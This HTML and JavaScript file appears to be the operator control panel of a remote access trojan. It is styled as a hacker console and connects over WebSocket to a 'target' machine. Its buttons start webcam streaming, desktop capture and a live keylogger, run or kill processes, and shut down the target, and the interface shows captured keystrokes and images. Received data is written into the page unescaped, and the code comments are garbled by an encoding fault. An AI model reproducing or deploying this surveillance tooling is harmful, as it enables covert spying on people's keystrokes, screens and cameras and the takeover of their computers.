<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>REMOTE_OPS // V5.1_FIXED</title>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Share+Tech+Mono&display=swap" rel="stylesheet">
    
    <style>
        /* --- 1. CORE VARIABLES --- */
        :root {
            --bg-color: #020202;
            --main-color: #00ff41; 
            --dim-color: #003b00;
            --accent-color: #00f7ff; 
            --alert-color: #ff003c; 
            --glass-bg: rgba(0, 10, 0, 0.9);
        }

        * { box-sizing: border-box; }

        body {
            font-family: 'Share Tech Mono', monospace;
            background-color: var(--bg-color);
            color: var(--main-color);
            margin: 0; padding: 0;
            height: 100vh;
            width: 100vw;
            overflow: hidden; /* CH·∫∂N TUY·ªÜT ƒê·ªêI SCROLL BODY */
            display: flex; flex-direction: column;
        }

        /* --- 2. LAYERS --- */
        canvas#matrix-bg { position: fixed; top: 0; left: 0; z-index: 0; opacity: 0.15; pointer-events: none; }
        .scanlines {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(to bottom, rgba(255,255,255,0), rgba(255,255,255,0) 50%, rgba(0,0,0,0.2) 50%, rgba(0,0,0,0.2));
            background-size: 100% 4px;
            z-index: 9999; 
            pointer-events: none; 
        }

        /* --- 3. UI COMPONENTS --- */
        
        /* HEADER (Fixed Height: 50px) */
        .header {
            height: 50px; display: flex; align-items: center; padding: 0 20px;
            border-bottom: 2px solid var(--main-color);
            background: rgba(0, 20, 0, 0.95);
            justify-content: space-between;
            position: relative; z-index: 10;
            flex-shrink: 0; /* Kh√¥ng cho ph√©p co l·∫°i */
        }

        /* GRID LAYOUT (Quan tr·ªçng: T√≠nh to√°n chi·ªÅu cao c√≤n l·∫°i) */
        .main-grid {
            display: grid;
            grid-template-columns: 280px 1fr 320px; 
            /* Tr·ª´ ƒëi Header(50px) + Padding(30px) + Ticker(25px) */
            height: calc(100vh - 50px - 25px); 
            gap: 15px; padding: 15px;
            position: relative; z-index: 10;
            overflow: hidden; /* N·ªôi dung tr√†n s·∫Ω b·ªã c·∫Øt ho·∫∑c cu·ªôn b√™n trong */
        }

        /* PANELS - S·ª≠a l·ªói Flexbox */
        .panel {
            background: var(--glass-bg);
            border: 1px solid var(--dim-color);
            padding: 10px; display: flex; flex-direction: column;
            position: relative;
            transition: all 0.3s;
            height: 100%; /* Chi·∫øm h·∫øt chi·ªÅu cao √¥ grid */
            overflow: hidden; /* Quan tr·ªçng: Gi·ªØ n·ªôi dung b√™n trong */
            min-height: 0; /* Fix l·ªói Flexbox tr√™n Firefox/Chrome */
        }
        .panel:hover { border-color: var(--main-color); box-shadow: 0 0 15px rgba(0, 255, 65, 0.1); }
        
        .corner { position: absolute; width: 6px; height: 6px; border-color: var(--accent-color); border-style: solid; transition: 0.3s; }
        .tl { top: -1px; left: -1px; border-width: 2px 0 0 2px; }
        .tr { top: -1px; right: -1px; border-width: 2px 2px 0 0; }
        .bl { bottom: -1px; left: -1px; border-width: 0 0 2px 2px; }
        .br { bottom: -1px; right: -1px; border-width: 0 2px 2px 0; }
        .panel:hover .corner { width: 100%; height: 100%; opacity: 0.1; }

        h3 {
            margin: 0 0 10px 0; font-size: 16px; color: var(--accent-color);
            border-bottom: 1px dashed var(--dim-color); padding-bottom: 5px;
            text-transform: uppercase; letter-spacing: 1px; flex-shrink: 0;
        }
        h3::before { content: ">> "; color: var(--main-color); }

        /* --- 4. BUTTONS & INPUTS --- */
        input {
            background: #000; border: 1px solid var(--dim-color); 
            color: var(--main-color); padding: 8px; 
            font-family: 'Share Tech Mono'; font-size: 13px;
            outline: none; transition: 0.3s;
        }
        input:focus { border-color: var(--main-color); box-shadow: 0 0 10px var(--dim-color); }

        button {
            background: rgba(0, 50, 0, 0.3); border: 1px solid var(--main-color);
            color: var(--main-color); padding: 6px 12px;
            cursor: pointer; text-transform: uppercase;
            font-family: 'Share Tech Mono'; font-weight: bold; font-size: 12px;
            position: relative; overflow: hidden; transition: all 0.2s;
        }
        button:hover { background: var(--main-color); color: #000; box-shadow: 0 0 15px var(--main-color); }
        button:active { transform: scale(0.95); } 
        .btn-red { border-color: var(--alert-color); color: var(--alert-color); background: rgba(50, 0, 0, 0.3); }
        .btn-red:hover { background: var(--alert-color); color: #fff; box-shadow: 0 0 15px var(--alert-color); }
        .btn-group { display: flex; gap: 5px; margin-bottom: 5px; flex-shrink: 0; }

        /* --- 5. CONTENT ELEMENTS (SCROLL FIX) --- */
        
        /* C·ªôt gi·ªØa: Ch·ª©a ·∫£nh */
        .col-center { display: flex; flex-direction: column; gap: 15px; height: 100%; overflow: hidden; }

        /* Khung ch·ª©a ·∫£nh (Fix tr√†n) */
        .screen-container {
            flex-grow: 1; /* T·ª± ƒë·ªông gi√£n */
            border: 1px solid var(--dim-color); background: #000;
            display: flex; align-items: center; justify-content: center;
            background-image: repeating-linear-gradient(0deg, transparent, transparent 1px, #001100 1px, #001100 2px);
            position: relative; overflow: hidden; 
            min-height: 0; /* Cho ph√©p co l·∫°i n·∫øu c·∫ßn */
        }
        img.view-area { 
            max-width: 100%; max-height: 100%; /* Gi·ªõi h·∫°n ·∫£nh trong khung */
            object-fit: contain; /* Gi·ªØ t·ª∑ l·ªá ·∫£nh */
            display: block; 
        }
        .rec-dot { position: absolute; top: 10px; right: 10px; color: red; font-size: 10px; animation: blink 1s infinite; display: none; }

        /* B·∫£ng d·ªØ li·ªáu (Fix tr√†n) */
        .table-wrap { 
            flex-grow: 1; /* Chi·∫øm ph·∫ßn c√≤n l·∫°i */
            overflow-y: auto; /* Ch·ªâ cu·ªôn ph·∫ßn n√†y */
            border: 1px solid var(--dim-color); margin-bottom: 10px; 
            min-height: 0; /* Quan tr·ªçng ƒë·ªÉ scroll ho·∫°t ƒë·ªông */
        }
        
        table { width: 100%; border-collapse: collapse; font-size: 12px; }
        th { position: sticky; top: 0; background: #002200; color: var(--accent-color); text-align: left; padding: 5px; z-index: 5; }
        td { padding: 4px 5px; border-bottom: 1px solid #001100; color: #888; }
        tr:hover td { background: var(--main-color); color: #000; cursor: pointer; }

        /* Ticker Footer */
        .ticker-wrap {
            position: fixed; bottom: 0; width: 100%; height: 25px;
            background: #000; border-top: 1px solid var(--dim-color);
            overflow: hidden; white-space: nowrap; z-index: 20;
        }
        .ticker { display: inline-block; animation: marquee 20s linear infinite; font-size: 12px; line-height: 25px; color: #555; }
        .ticker span { margin-right: 30px; }
        .ticker strong { color: var(--main-color); }
        @keyframes marquee { 0% { transform: translate(100%, 0); } 100% { transform: translate(-100%, 0); } }

        /* Log & Components */
        textarea { width: 100%; height: 100%; background: #000; border: none; color: var(--main-color); padding: 8px; resize: none; font-family: 'Fira Code'; font-size: 11px; outline: none; }
        #skull-art { font-family: 'Fira Code', monospace; font-size: 8px; line-height: 8px; color: var(--dim-color); text-align: center; margin: 10px 0; transition: color 0.5s; flex-shrink: 0; }
        .chart-container { width: 100%; height: 60px; border: 1px solid var(--dim-color); background: #000; margin-bottom: 10px; flex-shrink: 0; }
        canvas.chart { width: 100%; height: 100%; display: block; }

        @keyframes blink { 50% { opacity: 0; } }
        /* Scrollbar */
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-thumb { background: var(--dim-color); }
        ::-webkit-scrollbar-thumb:hover { background: var(--main-color); }

    </style>
</head>
<body>

    <canvas id="matrix-bg"></canvas>
    <div class="scanlines"></div>

    <div class="header">
        <div style="font-size: 22px; font-weight: bold; letter-spacing: 2px;">
            REMOTE<span style="color:var(--accent-color)">OPS</span> <span style="font-size:12px; color:#555">// V5.1_STABLE</span>
        </div>
        <div style="display: flex; gap: 10px; align-items: center;">
            <input type="text" id="ip" value="ws://localhost:9010" style="width: 220px; text-align: center;">
            <button onclick="connect()">INITIALIZE_LINK</button>
            <div id="status" style="width: 100px; text-align: center; border: 1px solid #333; padding: 5px; font-size: 12px; color: #555;">OFFLINE</div>
        </div>
    </div>

    <div class="main-grid">

        <div class="panel">
            <div class="corner tl"></div><div class="corner tr"></div><div class="corner bl"></div><div class="corner br"></div>
            <h3>SYSTEM_STATUS</h3>
            <pre id="skull-art">
      .ed"""" """$$$$be.
    -"           ^""**$$$e.
  ."                   '$$$c
 /                      "4$$b
d  3                      $$$$
C  $  .ec.        .ec.    $$$$
9  q  d$$b.      .d$$b.   $$$P
5  q. $$P"        "T$$   $$$P
 \  ".   .e.    .e.      $$$
  \   "  $$$    $$$     $$$
   ".    "$$    $$"    "$$
            </pre>
            <div style="font-size: 10px; color: var(--accent-color); margin-bottom: 2px;">NETWORK_TRAFFIC:</div>
            <div class="chart-container"><canvas id="net-chart" class="chart"></canvas></div>
            
            <div style="margin-top: auto; flex-shrink: 0;">
                <h3 style="color: var(--alert-color);">CRITICAL_OPS</h3>
                <button class="btn-red" style="width: 100%; margin-bottom: 8px;" onclick="if(confirm('SHUTDOWN?')) send('SYSTEM', 'SHUTDOWN')">üõë SHUTDOWN TARGET</button>
                <button style="width: 100%; border-color:#666; color:#888;" onclick="if(confirm('RESTART?')) send('SYSTEM', 'RESTART')">üîÑ REBOOT SYSTEM</button>
            </div>
        </div>

        <div class="col-center">
            <div class="panel" style="flex: 2; min-height: 0;">
                <div class="corner tl"></div><div class="corner tr"></div><div class="corner bl"></div><div class="corner br"></div>
                <div style="display: flex; justify-content: space-between; flex-shrink: 0;">
                    <h3>VISUAL_FEED</h3>
                    <div class="rec-dot" id="cam-rec">‚óè REC</div>
                </div>
                <div class="btn-group">
                    <button onclick="send('WEBCAM', 'START_STREAM'); document.getElementById('cam-rec').style.display='block'">‚ñ∂ ACTIVATE</button>
                    <button class="btn-red" onclick="send('WEBCAM', 'STOP_STREAM'); document.getElementById('cam-rec').style.display='none'">‚ñ† STOP</button>
                </div>
                <div class="screen-container">
                    <img id="cam-stream" class="view-area" alt="NO SIGNAL">
                </div>
            </div>

            <div class="panel" style="flex: 1.5; min-height: 0;">
                <div class="corner tl"></div><div class="corner tr"></div><div class="corner bl"></div><div class="corner br"></div>
                <h3 style="flex-shrink: 0;">DESKTOP_INTERCEPT</h3>
                <button onclick="captureScreen()" style="width: 100%; margin-bottom: 5px; flex-shrink: 0;">[ CAPTURE FRAME ]</button>
                <div class="screen-container">
                    <img id="screen-img" class="view-area" alt="WAITING DATA">
                </div>
            </div>

            <div class="panel" style="height: 140px; min-height: 140px; flex-shrink: 0;">
                <div class="corner tl"></div><div class="corner tr"></div><div class="corner bl"></div><div class="corner br"></div>
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px;">
                    <h3 style="border:none; margin:0;">KEY_LOGS</h3>
                    <div class="btn-group">
                        <button class="btn-red" onclick="send('KEYBOARD', 'START')">REC</button>
                        <button onclick="send('KEYBOARD', 'STOP')">STOP</button>
                        <button onclick="document.getElementById('keylog-out').value=''">CLR</button>
                    </div>
                </div>
                <div style="border: 1px solid var(--dim-color); flex-grow: 1;">
                    <textarea id="keylog-out" readonly placeholder="> Waiting for keystrokes..."></textarea>
                </div>
            </div>
        </div>

        <div class="panel">
            <div class="corner tl"></div><div class="corner tr"></div><div class="corner bl"></div><div class="corner br"></div>
            <h3>PROCESS_MANAGER</h3>
            
            <div class="btn-group">
                <input type="text" id="proc-path" placeholder="Process Name">
                <button onclick="startProcess()">EXEC</button>
            </div>
            <div class="btn-group">
                <button onclick="send('PROCESS', 'LIST')" style="flex: 1;">‚Üª REFRESH</button>
                <input type="number" id="proc-pid" placeholder="PID" style="width: 60px; flex:none;">
                <button class="btn-red" onclick="killProcess()">KILL</button>
            </div>
            
            <div class="table-wrap" style="flex: 1;">
                <table id="proc-table">
                    <thead><tr><th>ID</th><th>NAME</th><th>TH</th></tr></thead>
                    <tbody></tbody>
                </table>
            </div>

            <h3 style="margin-top: 15px; flex-shrink: 0;">APP_REGISTRY</h3>
            <button onclick="send('APP', 'LIST')" style="width: 100%; margin-bottom: 5px; flex-shrink: 0;">SCAN REGISTRY</button>
            
            <div class="table-wrap" style="height: 150px; flex-grow: 0; flex-shrink: 0;">
                <table id="app-table">
                    <thead><tr><th>APP NAME</th><th>ACT</th></tr></thead>
                    <tbody></tbody>
                </table>
            </div>
        </div>
    </div>

    <div class="ticker-wrap">
        <div class="ticker">
            <span>[SYSTEM]: <strong>READY</strong></span>
            <span>[ENCRYPTION]: <strong>AES-256</strong></span>
            <span>[PORT]: <strong>9010</strong></span>
            <span>[STATUS]: <strong>WAITING FOR TARGET...</strong></span>
            <span>[MODULES]: <strong>WEBCAM, SCREEN, KEYLOG, PROCESS LOADED</strong></span>
            <span>[WARNING]: <strong>UNAUTHORIZED ACCESS DETECTED</strong></span>
        </div>
    </div>

<script>
    // --- 1. MATRIX EFFECT ---
    const canvas = document.getElementById('matrix-bg');
    const ctx = canvas.getContext('2d');
    function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
    window.onresize = resize; resize();
    const chars = "01"; 
    const drops = Array(Math.floor(canvas.width/14)).fill(1);
    setInterval(() => {
        ctx.fillStyle = "rgba(0, 5, 0, 0.1)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = "#0f0"; ctx.font = "14px monospace";
        drops.forEach((y, i) => {
            const text = chars[Math.floor(Math.random()*chars.length)];
            ctx.fillText(text, i*14, y*14);
            if(y*14 > canvas.height && Math.random() > 0.98) drops[i] = 0;
            drops[i]++;
        });
    }, 50);

    // --- 2. CHART ANIMATION ---
    const chartCtx = document.getElementById('net-chart').getContext('2d');
    let data = Array(40).fill(30);
    setInterval(() => {
        data.shift(); data.push(Math.random() * 40 + 5);
        const w = chartCtx.canvas.width = chartCtx.canvas.clientWidth;
        const h = chartCtx.canvas.height = chartCtx.canvas.clientHeight;
        chartCtx.strokeStyle = "#00f7ff"; chartCtx.lineWidth = 1.5; chartCtx.beginPath();
        data.forEach((v, i) => { 
            const x = (i / data.length) * w;
            const y = h - v; 
            i===0 ? chartCtx.moveTo(x, y) : chartCtx.lineTo(x, y);
        });
        chartCtx.stroke();
    }, 80);

    // --- 3. LOGIC K·∫æT N·ªêI ---
    let ws = null;
    let isWaitingForScreenshot = false;

    function connect() {
        if(ws) { ws.close(); ws=null; }
        const ip = document.getElementById('ip').value;
        const btn = document.querySelector('.header button');
        const status = document.getElementById('status');

        btn.innerText = "CONNECTING...";
        
        try {
            ws = new WebSocket(ip);
            ws.binaryType = "arraybuffer";
            ws.onopen = () => {
                status.innerText = "ONLINE"; status.style.color = "#0f0"; status.style.borderColor = "#0f0";
                btn.innerText = "DISCONNECT";
                document.getElementById('skull-art').style.color = "#0f0";
                updateTicker("TARGET LOCKED. CONNECTION ESTABLISHED.");
            };
            ws.onclose = () => {
                status.innerText = "OFFLINE"; status.style.color = "#555"; status.style.borderColor = "#555";
                btn.innerText = "INITIALIZE LINK";
                document.getElementById('skull-art').style.color = "#555";
                updateTicker("CONNECTION LOST. SEARCHING...");
            };
            ws.onmessage = (evt) => {
                if(evt.data instanceof ArrayBuffer) {
                    const blob = new Blob([evt.data], {type: "image/jpeg"});
                    const url = URL.createObjectURL(blob);
                    if(isWaitingForScreenshot) {
                        document.getElementById('screen-img').src = url;
                        isWaitingForScreenshot = false;
                    } else {
                        document.getElementById('cam-stream').src = url;
                    }
                } else {
                    try { handleJson(JSON.parse(evt.data)); } catch(e){}
                }
            };
        } catch(e) { 
            btn.innerText = "ERROR";
            updateTicker("ERROR: INVALID TARGET ADDRESS.");
        }
    }

    function send(mod, cmd, pay={}) {
        if(!ws || ws.readyState!==1) return alert("NO CONNECTION");
        ws.send(JSON.stringify({module:mod, command:cmd, payload:pay}));
    }

    // UI Actions
    function captureScreen() { isWaitingForScreenshot=true; send('SCREEN', 'CAPTURE_BINARY'); }
    function killProcess() { const pid=document.getElementById('proc-pid').value; if(pid) send('PROCESS','KILL',{pid:parseInt(pid)}); }
    function startProcess() { const path=document.getElementById('proc-path').value; if(path) send('PROCESS','START',{path:path}); }
    
    function updateTicker(msg) {
        document.querySelector('.ticker').innerHTML += ` <span>[UPDATE]: <strong>${msg}</strong></span>`;
    }

    function handleJson(res) {
        if(res.status==='error') return updateTicker(`ERROR: ${res.message}`);
        
        if(res.module==='PROCESS' && res.command==='LIST') {
            const tb = document.querySelector('#proc-table tbody');
            tb.innerHTML = "";
            (res.data.process_list || []).slice(0, 300).forEach(p => {
                tb.innerHTML += `<tr onclick="document.getElementById('proc-pid').value='${p.pid}'"><td>${p.pid}</td><td>${p.name}</td><td>${p.threads}</td></tr>`;
            });
            updateTicker(`PROCESS LIST UPDATED: ${res.data.process_list.length} NODES.`);
        }
        else if(res.module==='APP' && res.command==='LIST') {
            const tb = document.querySelector('#app-table tbody');
            tb.innerHTML = "";
            (res.apps || []).forEach(a => {
                tb.innerHTML += `<tr><td>${a.exe}</td><td><button class="btn-red" style="padding:0 5px;" onclick="send('APP','KILL',{name:'${a.exe}'})">X</button></td></tr>`;
            });
            updateTicker("APPLICATION REGISTRY SCANNED.");
        }
        else if(res.module==='KEYBOARD') {
            const t = document.getElementById('keylog-out');
            let k = res.data.key; if(k==='[ENTER]') k='\n';
            t.value += k; t.scrollTop = t.scrollHeight;
        }
    }
</script>
</body>
</html>